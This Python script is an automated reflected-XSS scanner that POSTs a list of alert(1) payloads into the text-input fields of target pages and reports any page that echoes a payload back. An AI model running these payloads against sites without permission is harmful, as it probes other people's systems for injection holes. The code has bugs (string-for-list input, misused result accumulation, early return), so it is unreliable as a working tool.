#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-

import requests
import re
from urllib.parse import urlparse


class Xss:
    def __init__(self, targets):
        self.targets = targets
        self.target = ''
        self.payload = ['<img src=1 onerror=alert(1);>',
                        "><body onload=alert(1)>",
                        "</script><script>alert(1);</script>",
                        "<ScRiPt >alert(1);</ScRiPt>",
                        "eval(%26%23x27 alert(1)%26%23x27);void",
                        "/><script>alert(1);</script><!--"]

    def _scan(self):
        try:
            r = requests.get(self.target)
            # print('get')
        except:
            r = requests.post(self.target)
            # print('post')
        pattern = re.compile('<input.*?type="text".*?name=[\'|\"](.*?)[\'|\"].*?')
        names = re.findall(pattern, r.text)
        if names:
            for name in names:
                try:
                    for payload in self.payload:
                        r = requests.post(self.target, data={name: payload})
                        if payload in r.text:
                            return self.target
                except ConnectionResetError:
                    print('连接中断')
                    break
                except Exception as e:
                    print(e)
                    continue
                return False
        else:
            return False

    def get_xss(self):
        xss_test = []
        _xss = []

        for url in self.targets:
            if ('?' in url) and (url.split('?')[0] not in xss_test):
                xss_test.append(url.split('?')[0])
                _xss.append(url)
            elif urlparse(url).path.rsplit('/', 1)[0] == [] and urlparse(url).path not in xss_test:
                xss_test.append(urlparse(url).path)
                _xss.append(url)
            elif url.rsplit('/', 1)[0] not in xss_test:
                xss_test.append(url.rsplit('/', 1)[0])
                _xss.append(url)

        self.targets = _xss

    def run(self):
        print("\n检测XSS:")
        results = []
        self.get_xss()
        for target in self.targets:
            self.target = target
            result = self._scan()
            if result:
                print('可能存在漏洞; ' + result)
                results += result
        if not results:
            print('可能不存在漏洞')
        return results


def main():
    target = input('请输入测试网址:')
    s = Xss(target)
    s.run()

if __name__ == '__main__':
    main()
